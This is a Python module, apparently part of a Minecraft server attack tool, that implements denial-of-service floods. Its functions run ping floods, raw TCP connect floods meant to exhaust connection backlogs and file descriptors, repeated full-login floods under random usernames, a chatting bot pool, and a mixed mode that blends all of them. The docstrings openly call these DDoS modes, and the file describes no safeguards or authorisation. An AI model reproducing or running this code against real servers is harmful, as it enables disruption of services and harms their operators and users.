"""DDoS load modes: ping / tcp / login / bot / mixed.

All modes are async. `ping` and `tcp` need no auth and are cheap.
`login` repeatedly does a full handshake+login (expensive for server).
`bot` keeps connections alive + chats. `mixed` blends them.
"""
import asyncio
import random
import socket
import time

from .mcconn import MCConn, MCConnError
from .bots import BotPool


class Stats:
    def __init__(self):
        self.start = time.time()
        self.ok = 0
        self.fail = 0
        self.bytes = 0
        self._last = 0.0

    def add(self, ok=True, n=0):
        if ok:
            self.ok += 1
        else:
            self.fail += 1
        self.bytes += n

    def rate(self):
        now = time.time()
        dt = now - self._last
        if dt >= 1.0:
            self._last = now
            return self.ok
        return self.ok


async def ping_ddos(host, port, version, iterations=None, workers=20,
                    stop=None, stats=None, log=None):
    """Status ping flood. Cheap, hits the proxy/status pipeline."""
    stats = stats or Stats()
    stop = stop or (lambda: False)
    log = log or (lambda *a: None)
    done = 0

    async def worker():
        nonlocal done
        while not stop():
            c = MCConn(host, port, log=lambda *a: None)
            try:
                info = await c.status(version)
                stats.add(info is not None, 200 if info else 100)
            except Exception:
                stats.add(False, 100)
            finally:
                await c.close()
            done += 1

    ws = [asyncio.create_task(worker()) for _ in range(workers)]
    await asyncio.gather(*ws)


async def tcp_ddos(host, port, iterations=None, workers=20,
                   stop=None, stats=None, log=None):
    """Raw TCP connect flood. Hits backlog / fd exhaustion."""
    stats = stats or Stats()
    stop = stop or (lambda: False)
    log = log or (lambda *a: None)

    def connect():
        try:
            s = socket.create_connection((host, port), timeout=4.0)
            s.close()
            return True, 40
        except Exception:
            return False, 10

    loop = asyncio.get_running_loop()
    async def worker():
        while not stop():
            ok, n = await loop.run_in_executor(None, connect)
            stats.add(ok, n)

    ws = [asyncio.create_task(worker()) for _ in range(workers)]
    await asyncio.gather(*ws)


async def login_ddos(host, port, version, workers=20,
                     stop=None, stats=None, log=None):
    """Repeated full logins. Expensive: runs full login handshake each time."""
    stats = stats or Stats()
    stop = stop or (lambda: False)
    log = log or (lambda *a: None)

    async def worker():
        while not stop():
            c = MCConn(host, port, username=f"L{random.randint(1, 99999)}",
                       log=lambda *a: None)
            try:
                ok = await c.login(version, wait_play=False)
                stats.add(ok, 3000 if ok else 500)
            except Exception:
                stats.add(False, 500)
            finally:
                await c.close()
            await asyncio.sleep(random.uniform(0.05, 0.4))

    ws = [asyncio.create_task(worker()) for _ in range(workers)]
    await asyncio.gather(*ws)


def bot_load(host, port, version, count=20, proxy=None, online=False,
             chat_every=8.0, log=None):
    """Returns a running BotPool (keeps connections + chats)."""
    pool = BotPool(host, port, version, count=count, proxy=proxy,
                   online=online, log=log, chat_every=chat_every)
    pool.spawn(count)
    pool.start_all()
    return pool


async def mixed_ddos(host, port, version, workers=30, bot_count=10,
                     stop=None, stats=None, log=None):
    """Blend of ping + tcp + login + a small bot pool."""
    stats = stats or Stats()
    stop = stop or (lambda: False)
    log = log or (lambda *a: None)
    pool = bot_load(host, port, version, count=bot_count, log=log)

    modes = ["ping", "ping", "tcp", "login"]

    async def worker():
        while not stop():
            m = random.choice(modes)
            if m == "ping":
                c = MCConn(host, port, log=lambda *a: None)
                try:
                    info = await c.status(version)
                    stats.add(info is not None, 200)
                except Exception:
                    stats.add(False, 100)
                finally:
                    await c.close()
            elif m == "tcp":
                def connect():
                    try:
                        s = socket.create_connection((host, port), timeout=4.0)
                        s.close()
                        return True, 40
                    except Exception:
                        return False, 10
                ok, n = await asyncio.get_running_loop().run_in_executor(None, connect)
                stats.add(ok, n)
            else:
                c = MCConn(host, port, username=f"M{random.randint(1, 99999)}",
                           log=lambda *a: None)
                try:
                    ok = await c.login(version, wait_play=False)
                    stats.add(ok, 3000 if ok else 500)
                except Exception:
                    stats.add(False, 500)
                finally:
                    await c.close()
            await asyncio.sleep(random.uniform(0.02, 0.2))

    ws = [asyncio.create_task(worker()) for _ in range(workers)]
    await asyncio.gather(*ws)
    return pool
